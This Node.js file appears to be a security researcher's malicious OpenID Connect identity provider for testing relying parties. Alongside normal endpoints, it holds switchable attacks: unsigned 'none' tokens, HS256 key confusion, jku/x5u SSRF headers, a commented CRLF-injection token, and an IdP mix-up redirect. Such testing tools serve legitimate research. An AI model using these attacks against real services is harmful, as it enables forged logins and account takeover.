//
// OIDC Demo IdP - Easy to customize IdP for PoC and analysis purposes
//    DO NOT USE THIS IN ANY REGARD AS "PRODUCTION" SOFTWARE!!!
//
// Lauritz Holtmann 2020
// https://security.lauritz-holtmann.de/
//

// file system
const fs = require('fs');

// some SPs require TLS
const https = require("https");
const options = {
  key: fs.readFileSync("my-key.key"),
  cert: fs.readFileSync("my-certificate.crt")
};

// If we do not modify crypto related stuff, we may use a JWT library that does the heavy lifting for us
const useJWTLib = true; // set to false to explore id_token validation (crypto-wise)
const jwt = require("jsonwebtoken");
const privateKey = fs.readFileSync("private_unencrypted.pem", "utf-8");
const publicKey = fs.readFileSync("public.pem", "utf-8");
// Otherwise we craft the id_token using Node.js "crypto" + we need to encode stuff base64url manually
const crypto = require("crypto");
const base64url = require('base64url');

// Express.js web framework
const express = require("express");
const bodyParser = require('body-parser');
let app = express();
app.use(bodyParser.urlencoded());

/////////////////////////////////////////////////////////////////////////////////////////

// Constants
// Security feature: If the IdP is exposed to the internet, third parties can gather sensitive information on endpoints => introduce secret path prefix TODO: generate new prefix using SHA256(secret)
const path_prefix = "";
const host = "https://poc.local:3001";
//// endpoints - add "127.0.0.1 poc.local" to your /etc/hosts file!
const authEndpoint = `${host}${path_prefix}/auth`;
const tokenEndpoint = `${host}${path_prefix}/token`;
const userinfoEndpoint = `${host}${path_prefix}/userinfo`;
const jwksEndpoint = `${host}${path_prefix}/jwks`;
const registrationEndpoint = `${host}${path_prefix}/register`;
const configurationEndpoint = `${host}${path_prefix}/.well-known/openid-configuration`;

//// claims
const iss = host;
const sub = "TestUser";
const name = "Toni Test";
const email = "mail@lauritz-holtmann.de";
const exp = (Date.now() /1000 |0) + 3600; // https://stackoverflow.com/questions/221294/how-do-you-get-a-timestamp-in-javascript
const iat = (Date.now() /1000 |0);
const jti = "static";

//// client credentials
const client_id = "test.local";
const client_secret = "supersecret";

//// tokens
//
// CRLF injection in access_token
//const access_token = "AccessToken\x0d\x0a\x00\u250d\u250a\x0a\x0a\u3f0d\u3f0a\u0000X-Test: Lauritz";
//
const access_token = "AccessToken";
const refresh_token = "RefreshToken"
const code = "code_abcde";

// SP provided Variables
let state = "";
let nonce = "";

// id_token
function createIdToken() {
  let payload = {"iss": iss, "aud": client_id, "sub": sub, "email": email, "nonce": nonce, "exp": exp, "iat": iat, "jti": jti};
  if(useJWTLib === true) {
    return jwt.sign(payload, privateKey, {algorithm: 'RS256'});
  } else {
    // crypto related attacks may be realized using this block
    let header, toBeSigned;

    // instead of dirty uncommenting, use switch statement
    let choice = 0;
    switch (choice) {
      case 1:
        // "None" Algorithm: Exclude Signature (alternatively append Junk)
        header = {"alg": "none", "typ": "JWT"}
        return base64url(JSON.stringify(header)) + "." + base64url(JSON.stringify(payload));
      case 2:
        // HS256 hmac generation (e.g. using asymmetric key parameters as secret)
        header = {"alg": "HS256", "typ": "JWT", "kid": "test"}
        let secret = "AQAB"; // we use "e" as example value
        //let secret = "2PgMqqd9_xLENUu1wBAU5HwxicxiARAHw62IwGaRIlmFT5VOjt6dTY2SWcVxIafc0_2pUmeNQFyINkOwEGDdmj6a4MPmb9NuHaCniJUFmteIECIfqCRMW_-EoDs4h8rGarrjbYA7QFtk2oTyqE55OSPQkRsTFgRDjkHp9gYlCcFPmdbSa_xIqWmkyn_sZGVxuH0B05-17d1UujTb5hIp5hMyVRDG0bcpdlSUHrA3VdKHrscwAacWw86_DJsPv62OjuqPy5wKGQv8ulxJS9XRx47tlTUqerTUs1wGqFq3Ei_lj7DQ448vPmADjnWINjujU15QH9rSBHxIzCoLJ93nfcmAoXSx0TiJbG4BbCgTAAUW_xmylUamqY6lpquNtPwYysbgacVlhlsPGKNYqwseuQ1J7I_M3fleTi4_Sz9JHDWLQuKJ_Jxa7qcQLhmfg1s7fZZ_eNurrJcSbD9qPxa7K1SDNtHsGgOdSxUzcrOe4sFkP9gejG2vj4xqBw1-gdvnfbzcCKJ57EHQAuK9-cDtVWAABX0zaCrUFamCp01oYBi_T5ClLk1Yd-Hn_59U4PtWlDkifiCzI5aajqZV8f4mvP05TMxGT0FegEOxUJ0A_QOaFH3Og58CjIG3_MslZqAbkGOsWWZMu0KLM0Cdz0jLRsarYMmwcD2GZRXjI6wJVs8"; // we use "n" as example value
        //let secret = privateKey; // we use .pem key as example
        //let secret = publicKey; // we use .pem key as example

        // Prepare signed part of the JWT
        toBeSigned = base64url(JSON.stringify(header)) + "." + base64url(JSON.stringify(payload));

        let hmac = crypto.createHmac("sha256", secret).update(toBeSigned).digest("base64");;
        // we need base64url, thus we escape manually
        hmac_escaped = base64url.fromBase64(hmac);
        return toBeSigned + "." + hmac_escaped;
      case 3:
        // Potential SSRF and Key Confusion headers
        //header = {"alg": "RS256", "typ": "JWT", "kid": "test2", "x5u": "https://security.lauritz-holtmann.de", "jku": "https://security.lauritz-holtmann.de", "x5c": "junk", "jwk":  {"kty":"RSA","e":"AQAB","kid":"test2","use":"sig","n":"2PgMqqd9"}};
        header = {"alg": "RS256", "typ": "JWT", "kid": "test2", "x5u": host+path_prefix+"/log", "jku": host+path_prefix+"/log", "x5c": ["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"], "jwk":  {"kty":"RSA","e":"AQAB","kid":"test2","use":"sig","n":"2PgMqqd9"}};
      default:
        // RS256 signature generation using private key as secret -> this results in valid signed token
        if(header === undefined) header = {"alg": "RS256", "typ": "JWT", "kid": "test"};

        // Prepare signed part of the JWT
        toBeSigned = base64url(JSON.stringify(header)) + "." + base64url(JSON.stringify(payload));

        const signer = crypto.createSign('RSA-SHA256');
        signer.write(toBeSigned);
        signer.end();
        let signature = signer.sign(privateKey, 'base64');
        // we need base64url, thus we escape manually
        signature_escaped = base64url.fromBase64(signature);
        return toBeSigned + "." + signature_escaped;
    }
  }
};


// Templates
let landingPage = `
<h1>Sample OIDC Identity Provider</h1>

<ul>
  <li><a href="${authEndpoint}">${authEndpoint}</a></li>
  <li><a href="${tokenEndpoint}">${tokenEndpoint}</a></li>
  <li><a href="${userinfoEndpoint}">${userinfoEndpoint}</a></li>
  <li><a href="${jwksEndpoint}">${jwksEndpoint}</a></li>
  <li><a href="${registrationEndpoint}">${registrationEndpoint}</a></li>
  <li><a href="${configurationEndpoint}">${configurationEndpoint}</a></li>
</ul>
`;

let tokenResponse = {"access_token": access_token, "refresh_token": refresh_token, "token_type": "Bearer", "expires_in": "3600", "id_token": createIdToken()};
let userinfoResponse = {"sub": sub, "name": name, "email": email};
let configurationResponse = {"issuer": iss, "authorization_endpoint": authEndpoint, "token_endpoint": tokenEndpoint, "userinfo_endpoint": userinfoEndpoint, "jwks_uri": jwksEndpoint, "registration_endpoint": registrationEndpoint, "response_types_supported": ["code", "token id_token"], "subject_types_supported": ["public", "pairwise"], "id_token_signing_alg_values_supported": ["RS256"]};
let jwksResponse = {"keys": [{"kty":"RSA","e":"AQAB","kid":"test","use":"sig","n":"2PgMqqd9_xLENUu1wBAU5HwxicxiARAHw62IwGaRIlmFT5VOjt6dTY2SWcVxIafc0_2pUmeNQFyINkOwEGDdmj6a4MPmb9NuHaCniJUFmteIECIfqCRMW_-EoDs4h8rGarrjbYA7QFtk2oTyqE55OSPQkRsTFgRDjkHp9gYlCcFPmdbSa_xIqWmkyn_sZGVxuH0B05-17d1UujTb5hIp5hMyVRDG0bcpdlSUHrA3VdKHrscwAacWw86_DJsPv62OjuqPy5wKGQv8ulxJS9XRx47tlTUqerTUs1wGqFq3Ei_lj7DQ448vPmADjnWINjujU15QH9rSBHxIzCoLJ93nfcmAoXSx0TiJbG4BbCgTAAUW_xmylUamqY6lpquNtPwYysbgacVlhlsPGKNYqwseuQ1J7I_M3fleTi4_Sz9JHDWLQuKJ_Jxa7qcQLhmfg1s7fZZ_eNurrJcSbD9qPxa7K1SDNtHsGgOdSxUzcrOe4sFkP9gejG2vj4xqBw1-gdvnfbzcCKJ57EHQAuK9-cDtVWAABX0zaCrUFamCp01oYBi_T5ClLk1Yd-Hn_59U4PtWlDkifiCzI5aajqZV8f4mvP05TMxGT0FegEOxUJ0A_QOaFH3Og58CjIG3_MslZqAbkGOsWWZMu0KLM0Cdz0jLRsarYMmwcD2GZRXjI6wJVs8"}]};
//let jwksResponse = {"keys": [{"kty":"RSA","e":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","k":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "kid":"test","use":"sig","n":"2PgMqqd9_xLENUu1wBAU5HwxicxiARAHw62IwGaRIlmFT5VOjt6dTY2SWcVxIafc0_2pUmeNQFyINkOwEGDdmj6a4MPmb9NuHaCniJUFmteIECIfqCRMW_-EoDs4h8rGarrjbYA7QFtk2oTyqE55OSPQkRsTFgRDjkHp9gYlCcFPmdbSa_xIqWmkyn_sZGVxuH0B05-17d1UujTb5hIp5hMyVRDG0bcpdlSUHrA3VdKHrscwAacWw86_DJsPv62OjuqPy5wKGQv8ulxJS9XRx47tlTUqerTUs1wGqFq3Ei_lj7DQ448vPmADjnWINjujU15QH9rSBHxIzCoLJ93nfcmAoXSx0TiJbG4BbCgTAAUW_xmylUamqY6lpquNtPwYysbgacVlhlsPGKNYqwseuQ1J7I_M3fleTi4_Sz9JHDWLQuKJ_Jxa7qcQLhmfg1s7fZZ_eNurrJcSbD9qPxa7K1SDNtHsGgOdSxUzcrOe4sFkP9gejG2vj4xqBw1-gdvnfbzcCKJ57EHQAuK9-cDtVWAABX0zaCrUFamCp01oYBi_T5ClLk1Yd-Hn_59U4PtWlDkifiCzI5aajqZV8f4mvP05TMxGT0FegEOxUJ0A_QOaFH3Og58CjIG3_MslZqAbkGOsWWZMu0KLM0Cdz0jLRsarYMmwcD2GZRXjI6wJVs8"}, {"kty":"oct", "kid": "test2", "k":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}]};
let registrationResponse = {"client_id": client_id, "client_secret": client_secret, "client_secret_expires_at": 0};

// we cannot precalculate the id_token, thus dynamically refresh the Token Response
function refreshTokenResponse() {
  tokenResponse = {"access_token": access_token, "refresh_token": refresh_token, "token_type": "Bearer", "expires_in": "3600", "id_token": createIdToken()};
}

/////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////

// public landing page
app.get("/", function (req, res) {
  console.log(`\n  [${req.ip}] public landing page`);
  console.dir(req);
  res.send("Nothing to see here.");
});

// landing page
app.get(path_prefix+"/", function (req, res) {
  console.log(`\n  [${req.ip}] landing page`);
  
  res.send(landingPage);
});

// auth endpoint
app.get(path_prefix+"/auth", function (req, res) {
  console.log(`\n  [${req.ip}] auth endpoint (GET)`);
  if(!req.connection.encrypted) console.log('\x1b[41m\x1b[37mUNENCRYPTED CONNECTION!\x1b[0m');
  state = req.query.state;
  nonce = req.query.nonce;

  let redirect_uri = new URL(req.query.redirect_uri);
  let params = new URLSearchParams();
  params.append("code", code);
  params.append("state", state);
  let redirect_target = redirect_uri + "?" + params.toString();

  console.log(`      [*] Redirect target: ${redirect_target}`);

  res.redirect(301, redirect_target);
});

// mixup endpoint
app.get(path_prefix+"/mixup", function (req, res) {
  console.log(`\n  [${req.ip}] mix-up endpoint (GET)`);
  if(!req.connection.encrypted) console.log('\x1b[41m\x1b[37mUNENCRYPTED CONNECTION!\x1b[0m');
  state = req.query.state;
  nonce = req.query.nonce;

  // TODO: Adjust so that the following variable holds the Auth. Endpoint of a benign IdP
  let benignIdP = "https://085eb21dd892.ngrok.io/auth/realms/master/protocol/openid-connect/auth"; // Todo: Adjust!
  
  let redirect_uri = new URL(benignIdP);
  let params = new URLSearchParams();
  params.append("nonce", nonce);
  params.append("client_id", "lauritz"); // TODO: Must hold valid client_id of the target SP at the benign IdP
  params.append("state", state);
  params.append("response_type", "code");
  params.append("redirect_uri", req.query.redirect_uri);
  let redirect_target = redirect_uri + "?" + params.toString();

  console.log(`      [*] Redirect target: ${redirect_target}`);

  res.redirect(301, redirect_target);
});


// userinfo endpoint
app.get(path_prefix+"/userinfo", function (req, res) {
  console.log(`\n  [${req.ip}] userinfo endpoint`);
  if(!req.connection.encrypted) console.log('\x1b[41m\x1b[37mUNENCRYPTED CONNECTION!\x1b[0m');
  console.log("      [+] Request headers:");
  console.dir(req.headers);
  console.log(`      [*] Data to be sent: ${JSON.stringify(userinfoResponse)}`);
  
  res.json(userinfoResponse);
});

// configuration endpoint
app.get(path_prefix+"/.well-known/openid-configuration", function (req, res) {
  console.log(`\n  [${req.ip}] configuration endpoint`);
  if(!req.connection.encrypted) console.log('\x1b[41m\x1b[37mUNENCRYPTED CONNECTION!\x1b[0m');
  console.log("      [+] Request headers:");
  console.dir(req.headers);
  console.log(`      [*] Data to be sent: ${JSON.stringify(configurationResponse)}`);
  
  res.json(configurationResponse);
});

// token endpoint
app.post(path_prefix+"/token", function (req, res) {
  // craft token response based on provided nonce and fresh timestamps
  refreshTokenResponse();

  console.log(`\n  [${req.ip}] token endpoint`);
  if(!req.connection.encrypted) console.log('\x1b[41m\x1b[37mUNENCRYPTED CONNECTION!\x1b[0m');
  console.log("      [+] Request headers:");
  console.dir(req.headers);
  console.log("      [+] Request body:");
  console.dir(req.body);
  console.log(`      [*] Data to be sent: ${JSON.stringify(tokenResponse)}`);
  
  res.json(tokenResponse);
});

// jwks endpoint
app.get(path_prefix+"/jwks", function (req, res) {
  console.log(`\n  [${req.ip}] jwks endpoint`);
  console.log(`      [*] Data to be sent: ${JSON.stringify(jwksResponse)}`);

  res.json(jwksResponse);
});

// registration endpoint
app.get(path_prefix+"/register", function (req, res) {
  console.log(`\n  [${req.ip}] registration endpoint`);
  console.log(`      [*] Data to be sent: ${JSON.stringify(registrationResponse)}`);
  
  res.json(registrationResponse);
});

app.post(path_prefix+"/register", function (req, res) {
  console.log(`\n  [${req.ip}] registration endpoint`);
  console.log(`      [*] Data to be sent: ${JSON.stringify(registrationResponse)}`);
  
  res.status(201);
  res.json(registrationResponse);
});

// log endpoint - logs request
app.get(path_prefix+"/log", function (req, res) {
  console.log(`\n  [${req.ip}] log endpoint`);
  console.log("      [+] Request:");
  console.dir(req);
  
  res.json(req.headers);
});
// log endpoint - logs request - post
app.post(path_prefix+"/log", function (req, res) {
  console.log(`\n  [${req.ip}] log endpoint - post`);
  console.log("      [+] Request:");
  console.dir(req);
  console.log("      [+] Request body:");
  console.dir(req.body);
  
  res.json(req.headers);
});

/////////////////////////////////////////////////////////////////////////////////////////

app.listen(3000, function () {
  console.log("[+] Example IdP listening for HTTP  on Port 3000 :-)");
});

https.createServer(options, app).listen(3001);
console.log("[+] Example IdP listening for HTTPS on Port 3001 :-)");